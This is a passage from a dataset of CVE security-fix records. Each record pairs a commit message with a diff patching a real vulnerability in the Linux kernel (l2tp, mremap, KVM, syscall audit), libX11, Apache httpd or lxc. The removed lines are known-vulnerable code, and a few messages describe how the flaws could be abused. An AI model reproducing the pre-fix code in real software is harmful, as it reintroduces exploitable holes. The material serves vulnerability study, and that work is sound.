[<ffffffff81326dc8>] do_group_exit+0x108\/0x330\n [ 1116.897025] [<ffffffff81348cf7>] get_signal+0x617\/0x17a0 kernel\/signal.c:2307\n [ 1116.897025] [<ffffffff811b49af>] do_signal+0x7f\/0x18f0\n [ 1116.897025] [<ffffffff810039bf>] exit_to_usermode_loop+0xbf\/0x150 arch\/x86\/entry\/common.c:156\n [ 1116.897025] [<     inline     >] prepare_exit_to_usermode arch\/x86\/entry\/common.c:190\n [ 1116.897025] [<ffffffff81006060>] syscall_return_slowpath+0x1a0\/0x1e0 arch\/x86\/entry\/common.c:259\n [ 1116.897025] [<ffffffff85e4d726>] entry_SYSCALL_64_fastpath+0xc4\/0xc6\nMemory state around the buggy address:\n ffff8800081b0d80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n ffff8800081b0e00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n>ffff8800081b0e80: fc fc fc fc fc fc fc fc fb fb fb fb fb fb fb fb\n                                                    ^\n ffff8800081b0f00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n ffff8800081b0f80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n\n==================================================================\n\nThe same issue exists with l2tp_ip_bind() and l2tp_ip_bind_table.\n\nFixes: c51ce49735c1 (\"l2tp: fix oops in L2TP IP sockets for connect() AF_UNSPEC case\")\nReported-by: Baozeng Ding <sploving1@gmail.com>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Baozeng Ding <sploving1@gmail.com>\nSigned-off-by: Guillaume Nault <g.nault@alphalink.fr>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/l2tp\/l2tp_ip.c  | 5 +++--\n net\/l2tp\/l2tp_ip6.c | 5 +++--\n 2 files changed, 6 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/net\/l2tp\/l2tp_ip.c b\/net\/l2tp\/l2tp_ip.c\nindex fce25afb652a..982f6c44ea01 100644\n--- a\/net\/l2tp\/l2tp_ip.c\n+++ b\/net\/l2tp\/l2tp_ip.c\n@@ -251,8 +251,6 @@ static int l2tp_ip_bind(struct sock *sk, struct sockaddr *uaddr, int addr_len)\n \tint ret;\n \tint chk_addr_ret;\n \n-\tif (!sock_flag(sk, SOCK_ZAPPED))\n-\t\treturn -EINVAL;\n \tif (addr_len < sizeof(struct sockaddr_l2tpip))\n \t\treturn -EINVAL;\n \tif (addr->l2tp_family != AF_INET)\n@@ -267,6 +265,9 @@ static int l2tp_ip_bind(struct sock *sk, struct sockaddr *uaddr, int addr_len)\n \tread_unlock_bh(&l2tp_ip_lock);\n \n \tlock_sock(sk);\n+\tif (!sock_flag(sk, SOCK_ZAPPED))\n+\t\tgoto out;\n+\n \tif (sk->sk_state != TCP_CLOSE || addr_len < sizeof(struct sockaddr_l2tpip))\n \t\tgoto out;\n \ndiff --git a\/net\/l2tp\/l2tp_ip6.c b\/net\/l2tp\/l2tp_ip6.c\nindex ad3468c32b53..9978d01ba0ba 100644\n--- a\/net\/l2tp\/l2tp_ip6.c\n+++ b\/net\/l2tp\/l2tp_ip6.c\n@@ -269,8 +269,6 @@ static int l2tp_ip6_bind(struct sock *sk, struct sockaddr *uaddr, int addr_len)\n \tint addr_type;\n \tint err;\n \n-\tif (!sock_flag(sk, SOCK_ZAPPED))\n-\t\treturn -EINVAL;\n \tif (addr->l2tp_family != AF_INET6)\n \t\treturn -EINVAL;\n \tif (addr_len < sizeof(*addr))\n@@ -296,6 +294,9 @@ static int l2tp_ip6_bind(struct sock *sk, struct sockaddr *uaddr, int addr_len)\n \tlock_sock(sk);\n \n \terr = -EINVAL;\n+\tif (!sock_flag(sk, SOCK_ZAPPED))\n+\t\tgoto out_unlock;\n+\n \tif (sk->sk_state != TCP_CLOSE)\n \t\tgoto out_unlock;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-7942","CWE_ID":"264","category":"security","commit_id":"8ea762f94f4c942d898fdeb590a1630c83235c17","commit_message":"From 8ea762f94f4c942d898fdeb590a1630c83235c17 Mon Sep 17 00:00:00 2001\nFrom: Tobias Stoeckmann <tobias@stoeckmann.org>\nDate: Sun, 25 Sep 2016 21:25:25 +0200\nSubject: Validation of server responses in XGetImage()\n\nCheck if enough bytes were received for specified image type and\ngeometry. Otherwise GetPixel and other functions could trigger an\nout of boundary read later on.\n\nSigned-off-by: Tobias Stoeckmann <tobias@stoeckmann.org>\nReviewed-by: Matthieu Herrb <matthieu@herrb.eu>\n---\n src\/GetImage.c | 29 ++++++++++++++++++++---------\n 1 file changed, 20 insertions(+), 9 deletions(-)\n\n","diff_code":"diff --git a\/src\/GetImage.c b\/src\/GetImage.c\nindex c461abc..ff32d58 100644\n--- a\/src\/GetImage.c\n+++ b\/src\/GetImage.c\n@@ -59,6 +59,7 @@ XImage *XGetImage (\n \tchar *data;\n \tunsigned long nbytes;\n \tXImage *image;\n+\tint planes;\n \tLockDisplay(dpy);\n \tGetReq (GetImage, req);\n \t\/*\n@@ -91,18 +92,28 @@ XImage *XGetImage (\n \t    return (XImage *) NULL;\n \t}\n         _XReadPad (dpy, data, nbytes);\n-        if (format == XYPixmap)\n-\t   image = XCreateImage(dpy, _XVIDtoVisual(dpy, rep.visual),\n-\t\t  Ones (plane_mask &\n-\t\t\t(((unsigned long)0xFFFFFFFF) >> (32 - rep.depth))),\n-\t\t  format, 0, data, width, height, dpy->bitmap_pad, 0);\n-\telse \/* format == ZPixmap *\/\n-           image = XCreateImage (dpy, _XVIDtoVisual(dpy, rep.visual),\n-\t\t rep.depth, ZPixmap, 0, data, width, height,\n-\t\t  _XGetScanlinePad(dpy, (int) rep.depth), 0);\n+        if (format == XYPixmap) {\n+\t    image = XCreateImage(dpy, _XVIDtoVisual(dpy, rep.visual),\n+\t\tOnes (plane_mask &\n+\t\t    (((unsigned long)0xFFFFFFFF) >> (32 - rep.depth))),\n+\t\tformat, 0, data, width, height, dpy->bitmap_pad, 0);\n+\t    planes = image->depth;\n+\t} else { \/* format == ZPixmap *\/\n+            image = XCreateImage (dpy, _XVIDtoVisual(dpy, rep.visual),\n+\t\trep.depth, ZPixmap, 0, data, width, height,\n+\t\t    _XGetScanlinePad(dpy, (int) rep.depth), 0);\n+\t    planes = 1;\n+\t}\n \n \tif (!image)\n \t    Xfree(data);\n+\tif (planes < 1 || image->height < 1 || image->bytes_per_line < 1 ||\n+\t    INT_MAX \/ image->height <= image->bytes_per_line ||\n+\t    INT_MAX \/ planes <= image->height * image->bytes_per_line ||\n+\t    nbytes < planes * image->height * image->bytes_per_line) {\n+\t    XDestroyImage(image);\n+\t    image = NULL;\n+\t}\n \tUnlockDisplay(dpy);\n \tSyncHandle();\n \treturn (image);\n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"097eed103862f9c6a97f2e415e21d1134017b135","commit_message":"From 097eed103862f9c6a97f2e415e21d1134017b135 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Tue, 24 Nov 2009 08:43:52 -0500\nSubject: fix the arch checks in MREMAP_FIXED case\n\nAcked-by: Russell King <rmk+kernel@arm.linux.org.uk>\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n mm\/mremap.c | 19 +++++++++++++++++--\n 1 file changed, 17 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/mm\/mremap.c b\/mm\/mremap.c\nindex 9d0753983dcb..84efffb2d2c4 100644\n--- a\/mm\/mremap.c\n+++ b\/mm\/mremap.c\n@@ -325,6 +325,7 @@ static unsigned long mremap_to(unsigned long addr,\n \tstruct vm_area_struct *vma;\n \tunsigned long ret = -EINVAL;\n \tunsigned long charged = 0;\n+\tunsigned long map_flags;\n \n \tif (new_addr & ~PAGE_MASK)\n \t\tgoto out;\n@@ -362,9 +363,23 @@ static unsigned long mremap_to(unsigned long addr,\n \t\tgoto out;\n \t}\n \n-\tret = move_vma(vma, addr, old_len, new_len, new_addr);\n+\tmap_flags = MAP_FIXED;\n+\tif (vma->vm_flags & VM_MAYSHARE)\n+\t\tmap_flags |= MAP_SHARED;\n+\tret = arch_mmap_check(new_addr, new_len, map_flags);\n+\tif (ret)\n+\t\tgoto out1;\n+\tret = get_unmapped_area(vma->vm_file, new_addr, new_len, vma->vm_pgoff +\n+\t\t\t\t((addr - vma->vm_start) >> PAGE_SHIFT),\n+\t\t\t\tmap_flags);\n \tif (ret & ~PAGE_MASK)\n-\t\tvm_unacct_memory(charged);\n+\t\tgoto out1;\n+\n+\tret = move_vma(vma, addr, old_len, new_len, new_addr);\n+\tif (!(ret & ~PAGE_MASK))\n+\t\tgoto out;\n+out1:\n+\tvm_unacct_memory(charged);\n \n out:\n \treturn ret;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-3185","CWE_ID":"264","category":"security","commit_id":"cd2b7a26c776b0754fb98426a67804fd48118708","commit_message":"From cd2b7a26c776b0754fb98426a67804fd48118708 Mon Sep 17 00:00:00 2001\nFrom: \"William A. Rowe Jr\" <wrowe@apache.org>\nDate: Tue, 9 Jun 2015 20:41:28 +0000\nSubject: [PATCH] SECURITY: CVE-2015-3183 (cve.mitre.org)\n\nReplacement of ap_some_auth_required (unusable in Apache httpd 2.4)\nwith new ap_some_authn_required and ap_force_authn hook.\n\nSubmitted by: breser\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/httpd\/httpd\/trunk@1684524 13f79535-47bb-0310-9956-ffa450edef68\n---\n include\/ap_mmn.h       |  4 ++-\n include\/http_request.h | 24 ++++++++++++++\n server\/request.c       | 74 ++++++++++++++++++++++++++++++++----------\n 3 files changed, 83 insertions(+), 19 deletions(-)\n\n","diff_code":"diff --git a\/include\/ap_mmn.h b\/include\/ap_mmn.h\nindex 2821f97cfca..b8d7da88bba 100644\n--- a\/include\/ap_mmn.h\n+++ b\/include\/ap_mmn.h\n@@ -482,6 +482,8 @@\n  * 20150222.0 (2.5.0-dev)  ssl pre_handshake hook now indicates proxy|client\n  * 20150222.1 (2.5.0-dev)  Add keep_alive_timeout_set to server_rec\n  * 20150222.2 (2.5.0-dev)  Add response code 418 as per RFC2324\/RFC7168\n+ * 20150222.3 (2.5.0-dev)  Add ap_some_authn_required, ap_force_authn hook.\n+ *                         Deprecate broken ap_some_auth_required.\n  *\/\n \n #define MODULE_MAGIC_COOKIE 0x41503235UL \/* \"AP25\" *\/\n@@ -489,7 +491,7 @@\n #ifndef MODULE_MAGIC_NUMBER_MAJOR\n #define MODULE_MAGIC_NUMBER_MAJOR 20150222\n #endif\n-#define MODULE_MAGIC_NUMBER_MINOR 2                 \/* 0...n *\/\n+#define MODULE_MAGIC_NUMBER_MINOR 3                 \/* 0...n *\/\n \n \/**\n  * Determine if the server's current MODULE_MAGIC_NUMBER is at least a\ndiff --git a\/include\/http_request.h b\/include\/http_request.h\nindex 2317826f3a0..97591e3e3ee 100644\n--- a\/include\/http_request.h\n+++ b\/include\/http_request.h\n@@ -185,6 +185,9 @@ AP_DECLARE(void) ap_internal_fast_redirect(request_rec *sub_req, request_rec *r)\n  * is required for the current request\n  * @param r The current request\n  * @return 1 if authentication is required, 0 otherwise\n+ * @bug Behavior changed in 2.4.x refactoring, API no longer usable\n+ * @deprecated @see ap_some_authn_required()\n+ *\n  *\/\n AP_DECLARE(int) ap_some_auth_required(request_rec *r);\n \n@@ -541,6 +544,16 @@ AP_DECLARE_HOOK(void,insert_filter,(request_rec *r))\n  *\/\n AP_DECLARE_HOOK(int,post_perdir_config,(request_rec *r))\n \n+\/**\n+ * This hook allows a module to force authn to be required when\n+ * processing a request.\n+ * This hook should be registered with ap_hook_force_authn().\n+ * @param r The current request\n+ * @return OK (force authn), DECLINED (let later modules decide)\n+ * @ingroup hooks\n+ *\/\n+AP_DECLARE_HOOK(int,force_authn,(request_rec *r))\n+\n \/**\n  * This hook allows modules to handle\/emulate the apr_stat() calls\n  * needed for directory walk.\n@@ -587,6 +600,17 @@ AP_DECLARE(apr_bucket *) ap_bucket_eor_make(apr_bucket *b, request_rec *r);\n AP_DECLARE(apr_bucket *) ap_bucket_eor_create(apr_bucket_alloc_t *list,\n                                               request_rec *r);\n \n+\/**\n+ * Can be used within any handler to determine if any authentication\n+ * is required for the current request.  Note that if used with an\n+ * access_checker hook, an access_checker_ex hook or an authz provider; the\n+ * caller should take steps to avoid a loop since this function is\n+ * implemented by calling these hooks.\n+ * @param r The current request\n+ * @return TRUE if authentication is required, FALSE otherwise\n+ *\/\n+AP_DECLARE(int) ap_some_authn_required(request_rec *r);\n+\n #ifdef __cplusplus\n }\n #endif\ndiff --git a\/server\/request.c b\/server\/request.c\nindex 736c4c444ee..fa84c1ab325 100644\n--- a\/server\/request.c\n+++ b\/server\/request.c\n@@ -71,6 +71,7 @@ APR_HOOK_STRUCT(\n     APR_HOOK_LINK(create_request)\n     APR_HOOK_LINK(post_perdir_config)\n     APR_HOOK_LINK(dirwalk_stat)\n+    APR_HOOK_LINK(force_authn)\n )\n \n AP_IMPLEMENT_HOOK_RUN_FIRST(int,translate_name,\n@@ -97,6 +98,8 @@ AP_IMPLEMENT_HOOK_RUN_ALL(int, post_perdir_config,\n AP_IMPLEMENT_HOOK_RUN_FIRST(apr_status_t,dirwalk_stat,\n                             (apr_finfo_t *finfo, request_rec *r, apr_int32_t wanted),\n                             (finfo, r, wanted), AP_DECLINED)\n+AP_IMPLEMENT_HOOK_RUN_FIRST(int,force_authn,\n+                            (request_rec *r), (r), DECLINED)\n \n static int auth_internal_per_conf = 0;\n static int auth_internal_per_conf_hooks = 0;\n@@ -118,6 +121,39 @@ static int decl_die(int status, const char *phase, request_rec *r)\n     }\n }\n \n+AP_DECLARE(int) ap_some_authn_required(request_rec *r)\n+{\n+    int access_status;\n+\n+    switch (ap_satisfies(r)) {\n+    case SATISFY_ALL:\n+    case SATISFY_NOSPEC:\n+        if ((access_status = ap_run_access_checker(r)) != OK) {\n+            break;\n+        }\n+\n+        access_status = ap_run_access_checker_ex(r);\n+        if (access_status == DECLINED) {\n+            return TRUE;\n+        }\n+\n+        break;\n+    case SATISFY_ANY:\n+        if ((access_status = ap_run_access_checker(r)) == OK) {\n+            break;\n+        }\n+\n+        access_status = ap_run_access_checker_ex(r);\n+        if (access_status == DECLINED) {\n+            return TRUE;\n+        }\n+\n+        break;\n+    }\n+\n+    return FALSE;\n+}\n+\n \/* This is the master logic for processing requests.  Do NOT duplicate\n  * this logic elsewhere, or the security model will be broken by future\n  * API changes.  Each phase must be individually optimized to pick up\n@@ -236,15 +272,8 @@ AP_DECLARE(int) ap_process_request_internal(request_rec *r)\n             }\n \n             access_status = ap_run_access_checker_ex(r);\n-            if (access_status == OK) {\n-                ap_log_rerror(APLOG_MARK, APLOG_TRACE3, 0, r,\n-                              \"request authorized without authentication by \"\n-                              \"access_checker_ex hook: %s\", r->uri);\n-            }\n-            else if (access_status != DECLINED) {\n-                return decl_die(access_status, \"check access\", r);\n-            }\n-            else {\n+            if (access_status == DECLINED\n+                || (access_status == OK && ap_run_force_authn(r) == OK)) {\n                 if ((access_status = ap_run_check_user_id(r)) != OK) {\n                     return decl_die(access_status, \"check user\", r);\n                 }\n@@ -262,6 +291,14 @@ AP_DECLARE(int) ap_process_request_internal(request_rec *r)\n                     return decl_die(access_status, \"check authorization\", r);\n                 }\n             }\n+            else if (access_status == OK) {\n+                ap_log_rerror(APLOG_MARK, APLOG_TRACE3, 0, r,\n+                              \"request authorized without authentication by \"\n+                              \"access_checker_ex hook: %s\", r->uri);\n+            }\n+            else {\n+                return decl_die(access_status, \"check access\", r);\n+            }\n             break;\n         case SATISFY_ANY:\n             if ((access_status = ap_run_access_checker(r)) == OK) {\n@@ -273,15 +310,8 @@ AP_DECLARE(int) ap_process_request_internal(request_rec *r)\n             }\n \n             access_status = ap_run_access_checker_ex(r);\n-            if (access_status == OK) {\n-                ap_log_rerror(APLOG_MARK, APLOG_TRACE3, 0, r,\n-                              \"request authorized without authentication by \"\n-                              \"access_checker_ex hook: %s\", r->uri);\n-            }\n-            else if (access_status != DECLINED) {\n-                return decl_die(access_status, \"check access\", r);\n-            }\n-            else {\n+            if (access_status == DECLINED\n+                || (access_status == OK && ap_run_force_authn(r) == OK)) {\n                 if ((access_status = ap_run_check_user_id(r)) != OK) {\n                     return decl_die(access_status, \"check user\", r);\n                 }\n@@ -299,6 +329,14 @@ AP_DECLARE(int) ap_process_request_internal(request_rec *r)\n                     return decl_die(access_status, \"check authorization\", r);\n                 }\n             }\n+            else if (access_status == OK) {\n+                ap_log_rerror(APLOG_MARK, APLOG_TRACE3, 0, r,\n+                              \"request authorized without authentication by \"\n+                              \"access_checker_ex hook: %s\", r->uri);\n+            }\n+            else {\n+                return decl_die(access_status, \"check access\", r);\n+            }\n             break;\n         }\n     }\n","owner":"apache","repo":"httpd","source":"cve"},{"CVE_ID":"CVE-2009-0834","CWE_ID":"264","category":"security","commit_id":"ccbe495caa5e604b04d5a31d7459a6f6a76a756c","commit_message":"From ccbe495caa5e604b04d5a31d7459a6f6a76a756c Mon Sep 17 00:00:00 2001\nFrom: Roland McGrath <roland@redhat.com>\nDate: Fri, 27 Feb 2009 19:03:24 -0800\nSubject: x86-64: syscall-audit: fix 32\/64 syscall hole\n\nOn x86-64, a 32-bit process (TIF_IA32) can switch to 64-bit mode with\nljmp, and then use the \"syscall\" instruction to make a 64-bit system\ncall.  A 64-bit process make a 32-bit system call with int $0x80.\n\nIn both these cases, audit_syscall_entry() will use the wrong system\ncall number table and the wrong system call argument registers.  This\ncould be used to circumvent a syscall audit configuration that filters\nbased on the syscall numbers or argument details.\n\nSigned-off-by: Roland McGrath <roland@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n arch\/x86\/kernel\/ptrace.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kernel\/ptrace.c b\/arch\/x86\/kernel\/ptrace.c\nindex 5a4c23d89892..06ca07f6ad86 100644\n--- a\/arch\/x86\/kernel\/ptrace.c\n+++ b\/arch\/x86\/kernel\/ptrace.c\n@@ -1388,7 +1388,7 @@ void send_sigtrap(struct task_struct *tsk, struct pt_regs *regs,\n #ifdef CONFIG_X86_32\n # define IS_IA32\t1\n #elif defined CONFIG_IA32_EMULATION\n-# define IS_IA32\ttest_thread_flag(TIF_IA32)\n+# define IS_IA32\tis_compat_task()\n #else\n # define IS_IA32\t0\n #endif\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-10853","CWE_ID":"264","category":"security","commit_id":"3c9fa24ca7c9c47605672916491f79e8ccacb9e6","commit_message":"From 3c9fa24ca7c9c47605672916491f79e8ccacb9e6 Mon Sep 17 00:00:00 2001\nFrom: Paolo Bonzini <pbonzini@redhat.com>\nDate: Wed, 6 Jun 2018 17:38:09 +0200\nSubject: kvm: x86: use correct privilege level for sgdt\/sidt\/fxsave\/fxrstor\n access\n\nThe functions that were used in the emulation of fxrstor, fxsave, sgdt and\nsidt were originally meant for task switching, and as such they did not\ncheck privilege levels.  This is very bad when the same functions are used\nin the emulation of unprivileged instructions.  This is CVE-2018-10853.\n\nThe obvious fix is to add a new argument to ops->read_std and ops->write_std,\nwhich decides whether the access is a \"system\" access or should use the\nprocessor's CPL.\n\nFixes: 129a72a0d3c8 (\"KVM: x86: Introduce segmented_write_std\", 2017-01-12)\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch\/x86\/include\/asm\/kvm_emulate.h |  6 ++++--\n arch\/x86\/kvm\/emulate.c             | 12 ++++++------\n arch\/x86\/kvm\/x86.c                 | 22 ++++++++++++++++------\n 3 files changed, 26 insertions(+), 14 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/include\/asm\/kvm_emulate.h b\/arch\/x86\/include\/asm\/kvm_emulate.h\nindex b24b1c8b3979..0f82cd91cd3c 100644\n--- a\/arch\/x86\/include\/asm\/kvm_emulate.h\n+++ b\/arch\/x86\/include\/asm\/kvm_emulate.h\n@@ -107,11 +107,12 @@ struct x86_emulate_ops {\n \t *  @addr:  [IN ] Linear address from which to read.\n \t *  @val:   [OUT] Value read from memory, zero-extended to 'u_long'.\n \t *  @bytes: [IN ] Number of bytes to read from memory.\n+\t *  @system:[IN ] Whether the access is forced to be at CPL0.\n \t *\/\n \tint (*read_std)(struct x86_emulate_ctxt *ctxt,\n \t\t\tunsigned long addr, void *val,\n \t\t\tunsigned int bytes,\n-\t\t\tstruct x86_exception *fault);\n+\t\t\tstruct x86_exception *fault, bool system);\n \n \t\/*\n \t * read_phys: Read bytes of standard (non-emulated\/special) memory.\n@@ -129,10 +130,11 @@ struct x86_emulate_ops {\n \t *  @addr:  [IN ] Linear address to which to write.\n \t *  @val:   [OUT] Value write to memory, zero-extended to 'u_long'.\n \t *  @bytes: [IN ] Number of bytes to write to memory.\n+\t *  @system:[IN ] Whether the access is forced to be at CPL0.\n \t *\/\n \tint (*write_std)(struct x86_emulate_ctxt *ctxt,\n \t\t\t unsigned long addr, void *val, unsigned int bytes,\n-\t\t\t struct x86_exception *fault);\n+\t\t\t struct x86_exception *fault, bool system);\n \t\/*\n \t * fetch: Read bytes of standard (non-emulated\/special) memory.\n \t *        Used for instruction fetch.\ndiff --git a\/arch\/x86\/kvm\/emulate.c b\/arch\/x86\/kvm\/emulate.c\nindex fcf54642b293..4c4f4263420c 100644\n--- a\/arch\/x86\/kvm\/emulate.c\n+++ b\/arch\/x86\/kvm\/emulate.c\n@@ -815,14 +815,14 @@ static inline int jmp_rel(struct x86_emulate_ctxt *ctxt, int rel)\n static int linear_read_system(struct x86_emulate_ctxt *ctxt, ulong linear,\n \t\t\t      void *data, unsigned size)\n {\n-\treturn ctxt->ops->read_std(ctxt, linear, data, size, &ctxt->exception);\n+\treturn ctxt->ops->read_std(ctxt, linear, data, size, &ctxt->exception, true);\n }\n \n static int linear_write_system(struct x86_emulate_ctxt *ctxt,\n \t\t\t       ulong linear, void *data,\n \t\t\t       unsigned int size)\n {\n-\treturn ctxt->ops->write_std(ctxt, linear, data, size, &ctxt->exception);\n+\treturn ctxt->ops->write_std(ctxt, linear, data, size, &ctxt->exception, true);\n }\n \n static int segmented_read_std(struct x86_emulate_ctxt *ctxt,\n@@ -836,7 +836,7 @@ static int segmented_read_std(struct x86_emulate_ctxt *ctxt,\n \trc = linearize(ctxt, addr, size, false, &linear);\n \tif (rc != X86EMUL_CONTINUE)\n \t\treturn rc;\n-\treturn ctxt->ops->read_std(ctxt, linear, data, size, &ctxt->exception);\n+\treturn ctxt->ops->read_std(ctxt, linear, data, size, &ctxt->exception, false);\n }\n \n static int segmented_write_std(struct x86_emulate_ctxt *ctxt,\n@@ -850,7 +850,7 @@ static int segmented_write_std(struct x86_emulate_ctxt *ctxt,\n \trc = linearize(ctxt, addr, size, true, &linear);\n \tif (rc != X86EMUL_CONTINUE)\n \t\treturn rc;\n-\treturn ctxt->ops->write_std(ctxt, linear, data, size, &ctxt->exception);\n+\treturn ctxt->ops->write_std(ctxt, linear, data, size, &ctxt->exception, false);\n }\n \n \/*\n@@ -2928,12 +2928,12 @@ static bool emulator_io_port_access_allowed(struct x86_emulate_ctxt *ctxt,\n #ifdef CONFIG_X86_64\n \tbase |= ((u64)base3) << 32;\n #endif\n-\tr = ops->read_std(ctxt, base + 102, &io_bitmap_ptr, 2, NULL);\n+\tr = ops->read_std(ctxt, base + 102, &io_bitmap_ptr, 2, NULL, true);\n \tif (r != X86EMUL_CONTINUE)\n \t\treturn false;\n \tif (io_bitmap_ptr + port\/8 > desc_limit_scaled(&tr_seg))\n \t\treturn false;\n-\tr = ops->read_std(ctxt, base + io_bitmap_ptr + port\/8, &perm, 2, NULL);\n+\tr = ops->read_std(ctxt, base + io_bitmap_ptr + port\/8, &perm, 2, NULL, true);\n \tif (r != X86EMUL_CONTINUE)\n \t\treturn false;\n \tif ((perm >> bit_idx) & mask)\ndiff --git a\/arch\/x86\/kvm\/x86.c b\/arch\/x86\/kvm\/x86.c\nindex 2bbe9858e187..439fb0c7dbc0 100644\n--- a\/arch\/x86\/kvm\/x86.c\n+++ b\/arch\/x86\/kvm\/x86.c\n@@ -4811,10 +4811,15 @@ EXPORT_SYMBOL_GPL(kvm_read_guest_virt);\n \n static int emulator_read_std(struct x86_emulate_ctxt *ctxt,\n \t\t\t     gva_t addr, void *val, unsigned int bytes,\n-\t\t\t     struct x86_exception *exception)\n+\t\t\t     struct x86_exception *exception, bool system)\n {\n \tstruct kvm_vcpu *vcpu = emul_to_vcpu(ctxt);\n-\treturn kvm_read_guest_virt_helper(addr, val, bytes, vcpu, 0, exception);\n+\tu32 access = 0;\n+\n+\tif (!system && kvm_x86_ops->get_cpl(vcpu) == 3)\n+\t\taccess |= PFERR_USER_MASK;\n+\n+\treturn kvm_read_guest_virt_helper(addr, val, bytes, vcpu, access, exception);\n }\n \n static int kvm_read_guest_phys_system(struct x86_emulate_ctxt *ctxt,\n@@ -4858,12 +4863,17 @@ out:\n }\n \n static int emulator_write_std(struct x86_emulate_ctxt *ctxt, gva_t addr, void *val,\n-\t\t\t      unsigned int bytes, struct x86_exception *exception)\n+\t\t\t      unsigned int bytes, struct x86_exception *exception,\n+\t\t\t      bool system)\n {\n \tstruct kvm_vcpu *vcpu = emul_to_vcpu(ctxt);\n+\tu32 access = PFERR_WRITE_MASK;\n+\n+\tif (!system && kvm_x86_ops->get_cpl(vcpu) == 3)\n+\t\taccess |= PFERR_USER_MASK;\n \n \treturn kvm_write_guest_virt_helper(addr, val, bytes, vcpu,\n-\t\t\t\t\t   PFERR_WRITE_MASK, exception);\n+\t\t\t\t\t   access, exception);\n }\n \n int kvm_write_guest_virt_system(struct kvm_vcpu *vcpu, gva_t addr, void *val,\n@@ -4882,8 +4892,8 @@ int handle_ud(struct kvm_vcpu *vcpu)\n \tstruct x86_exception e;\n \n \tif (force_emulation_prefix &&\n-\t    kvm_read_guest_virt(&vcpu->arch.emulate_ctxt,\n-\t\t\t\tkvm_get_linear_rip(vcpu), sig, sizeof(sig), &e) == 0 &&\n+\t    kvm_read_guest_virt(vcpu, kvm_get_linear_rip(vcpu),\n+\t\t\t\tsig, sizeof(sig), &e) == 0 &&\n \t    memcmp(sig, \"\\xf\\xbkvm\", sizeof(sig)) == 0) {\n \t\tkvm_rip_write(vcpu, kvm_rip_read(vcpu) + sizeof(sig));\n \t\temul_type = 0;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2017-5985","CWE_ID":"264","category":"security","commit_id":"16af238036a5464ae8f2420ed3af214f0de875f9","commit_message":"From 16af238036a5464ae8f2420ed3af214f0de875f9 Mon Sep 17 00:00:00 2001\nFrom: Christian Brauner <christian.brauner@ubuntu.com>\nDate: Sat, 28 Jan 2017 13:02:34 +0100\nSubject: [PATCH] CVE-2017-5985: Ensure target netns is caller-owned\n\nBefore this commit, lxc-user-nic could potentially have been tricked into\noperating on a network namespace over which the caller did not hold privilege.\n\nThis commit ensures that the caller is privileged over the network namespace by\ntemporarily dropping privilege.\n\nLaunchpad: https:\/\/bugs.launchpad.net\/ubuntu\/+source\/lxc\/+bug\/1654676\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Christian Brauner <christian.brauner@ubuntu.com>\n---\n src\/lxc\/lxc_user_nic.c | 119 ++++++++++++++++++++++++++++++-----------\n 1 file changed, 87 insertions(+), 32 deletions(-)\n\n","diff_code":"diff --git a\/src\/lxc\/lxc_user_nic.c b\/src\/lxc\/lxc_user_nic.c\nindex 409a53a16c..96dc3986fd 100644\n--- a\/src\/lxc\/lxc_user_nic.c\n+++ b\/src\/lxc\/lxc_user_nic.c\n@@ -50,6 +50,14 @@\n #include \"utils.h\"\n #include \"network.h\"\n \n+#define usernic_debug_stream(stream, format, ...)                              \\\n+\tdo {                                                                   \\\n+\t\tfprintf(stream, \"%s: %d: %s: \" format, __FILE__, __LINE__,     \\\n+\t\t\t__func__, __VA_ARGS__);                                \\\n+\t} while (false)\n+\n+#define usernic_error(format, ...) usernic_debug_stream(stderr, format, __VA_ARGS__)\n+\n static void usage(char *me, bool fail)\n {\n \tfprintf(stderr, \"Usage: %s lxcpath name pid type bridge nicname\\n\", me);\n@@ -670,68 +678,115 @@ static bool create_db_dir(char *fnam)\n }\n \n #define VETH_DEF_NAME \"eth%d\"\n-\n static int rename_in_ns(int pid, char *oldname, char **newnamep)\n {\n-\tint fd = -1, ofd = -1, ret, ifindex = -1;\n+\tuid_t ruid, suid, euid;\n+\tint fret = -1;\n+\tint fd = -1, ifindex = -1, ofd = -1, ret;\n \tbool grab_newname = false;\n \n \tofd = lxc_preserve_ns(getpid(), \"net\");\n \tif (ofd < 0) {\n-\t\tfprintf(stderr, \"Failed opening network namespace path for '%d'.\", getpid());\n-\t\treturn -1;\n+\t\tusernic_error(\"Failed opening network namespace path for '%d'.\", getpid());\n+\t\treturn fret;\n \t}\n \n \tfd = lxc_preserve_ns(pid, \"net\");\n \tif (fd < 0) {\n-\t\tfprintf(stderr, \"Failed opening network namespace path for '%d'.\", pid);\n-\t\treturn -1;\n+\t\tusernic_error(\"Failed opening network namespace path for '%d'.\", pid);\n+\t\tgoto do_partial_cleanup;\n+\t}\n+\n+\tret = getresuid(&ruid, &euid, 